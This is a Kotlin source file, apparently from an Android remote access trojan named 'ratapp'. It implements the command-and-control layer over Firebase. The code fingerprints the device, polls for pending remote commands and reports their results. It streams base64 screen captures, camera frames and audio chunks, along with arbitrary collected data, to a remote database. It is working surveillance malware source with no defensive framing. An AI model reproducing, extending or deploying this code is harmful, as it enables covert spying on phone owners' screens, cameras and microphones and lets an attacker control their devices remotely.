package com.ratio.ratapp

import android.provider.Settings
import com.google.firebase.auth.FirebaseAuth
import com.google.firebase.database.DataSnapshot
import com.google.firebase.database.DatabaseError
import com.google.firebase.database.DatabaseReference
import com.google.firebase.database.FirebaseDatabase
import com.google.firebase.database.ValueEventListener
import kotlinx.coroutines.channels.awaitClose
import kotlinx.coroutines.flow.callbackFlow
import kotlinx.coroutines.tasks.await

object Fire {
    val db: DatabaseReference get() = FirebaseDatabase.getInstance().getReference("ratio")
    var deviceId: String = ""

    fun initDeviceId(ctx: android.content.Context) {
        deviceId = Settings.Secure.getString(ctx.contentResolver, Settings.Secure.ANDROID_ID) ?: "unknown"
        deviceId = "$deviceId-${FirebaseAuth.getInstance().currentUser?.uid?.take(6) ?: "anon"}"
    }

    fun deviceRef(): DatabaseReference = db.child("devices").child(deviceId)

    fun pushHeartbeat(map: Map<String, Any?>) {
        deviceRef().child("info").setValue(map)
    }

    fun pushStatus(map: Map<String, Any?>) {
        deviceRef().child("status").updateChildren(map)
    }

    fun pushResponse(cmdId: String, data: Any?) {
        val ref = deviceRef().child("responses").push()
        val map = mapOf(
            "cmdId" to cmdId,
            "ts" to System.currentTimeMillis(),
            "data" to data
        )
        ref.setValue(map)
    }

    fun pushResponseAsync(cmdId: String, data: Any?) { pushResponse(cmdId, data) }

    fun markCommandDone(cmdId: String) {
        deviceRef().child("commands").child(cmdId).child("status").setValue("done")
    }

    fun markCommandRunning(cmdId: String) {
        deviceRef().child("commands").child(cmdId).child("status").setValue("running")
    }

    fun markCommandFailed(cmdId: String, err: String) {
        deviceRef().child("commands").child(cmdId).updateChildren(mapOf(
            "status" to "failed",
            "error" to err
        ))
    }

    fun screenFrame(base64: String) {
        deviceRef().child("streams").child("screen").setValue(mapOf(
            "frame" to base64,
            "ts" to System.currentTimeMillis()
        ))
    }

    fun cameraFrame(base64: String, facing: String) {
        deviceRef().child("streams").child("camera").setValue(mapOf(
            "frame" to base64,
            "facing" to facing,
            "ts" to System.currentTimeMillis()
        ))
    }

    fun audioChunk(base64: String, seq: Long) {
        val ref = deviceRef().child("streams").child("audio").child("chunks").push()
        ref.setValue(mapOf(
            "data" to base64,
            "seq" to seq,
            "ts" to System.currentTimeMillis()
        ))
    }

    suspend fun pushData(path: String, data: Any?) {
        deviceRef().child("data").child(path).setValue(data).await()
    }

    fun pushDataAsync(path: String, data: Any?) {
        deviceRef().child("data").child(path).setValue(data)
    }

    fun listenCommands(handler: (String, String, Map<String, Any?>) -> Unit): ValueEventListener {
        val ref = deviceRef().child("commands")
        val listener = object : ValueEventListener {
            override fun onDataChange(snap: DataSnapshot) {
                for (child in snap.children) {
                    val status = child.child("status").getValue(String::class.java) ?: "pending"
                    if (status == "pending") {
                        val id = child.key ?: continue
                        val type = child.child("type").getValue(String::class.java) ?: continue
                        val args = (child.child("args").value as? Map<String, Any?>) ?: emptyMap()
                        handler(id, type, args)
                    }
                }
            }
            override fun onCancelled(e: DatabaseError) {}
        }
        ref.addValueEventListener(listener)
        return listener
    }

    fun listenCommandsFlow() = callbackFlow<Pair<String, Map<String, Any?>>> {
        val ref = deviceRef().child("commands")
        val l = object : ValueEventListener {
            override fun onDataChange(snap: DataSnapshot) {
                for (child in snap.children) {
                    if (child.child("status").getValue(String::class.java) == "pending") {
                        val id = child.key ?: continue
                        val type = child.child("type").getValue(String::class.java) ?: continue
                        val args = (child.child("args").value as? Map<String, Any?>) ?: emptyMap()
                        trySend(id to (mapOf("type" to type) + args))
                    }
                }
            }
            override fun onCancelled(e: DatabaseError) {}
        }
        ref.addValueEventListener(l)
        awaitClose { ref.removeEventListener(l) }
    }
}